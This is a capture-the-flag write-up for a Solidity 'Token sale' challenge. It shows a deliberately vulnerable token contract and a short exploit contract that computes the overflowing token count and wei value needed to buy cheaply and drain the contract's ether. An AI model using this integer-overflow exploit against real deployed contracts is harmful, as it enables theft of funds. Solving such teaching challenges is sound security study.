# Token sale
<sup>MATH: 500 POINTS</sup>

This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.

The contract starts off with a balance of 1 ether. See if you can take some of that away.

```solidity
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```

Enjoy this inspirational music while you work: [~~Sale~~ Sail](https://youtu.be/tgIqecROs5M).

No Safe Math :D 

```solidity
contract Exploit {
    uint256 public PRICE_PER_TOKEN = 1 ether;
    uint256 public MAX_INT = 2 ** 256 - 1;
    uint256 public token = (MAX_INT / PRICE_PER_TOKEN) + 1;
    uint256 public value = token * PRICE_PER_TOKEN;
    // Token 115792089237316195423570985008687907853269984665640564039458
    // WEI   415992086870360064
}
```

We can overflow this condition `require(msg.value == numTokens * PRICE_PER_TOKEN);` to get a large amount of token and then sell one to empty the contract
